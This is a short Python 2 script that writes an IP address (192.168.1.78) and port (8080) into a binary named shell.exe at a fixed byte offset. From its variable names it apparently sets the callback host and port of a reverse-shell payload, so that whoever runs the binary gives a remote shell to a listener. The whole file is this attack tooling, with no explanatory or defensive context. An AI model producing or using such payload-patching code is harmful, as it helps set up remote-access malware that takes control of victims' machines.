#!/usr/bin/env python2

lhost_bytes = []
lhost = "192.168.1.78"
lhost_bytes = [chr(int(part)) for part in lhost.split(".")]
port = 8080
lport_bytes = [chr(int(hex(port)[2:4], 16)), chr(int(hex(port)[4:6].ljust(2,"0"), 16))]
with open("shell.exe","r+b") as f:
	f.seek(972, 0)
	for part in lhost_bytes:
		f.write(part)
	for part in lport_bytes:
		f.write(part)
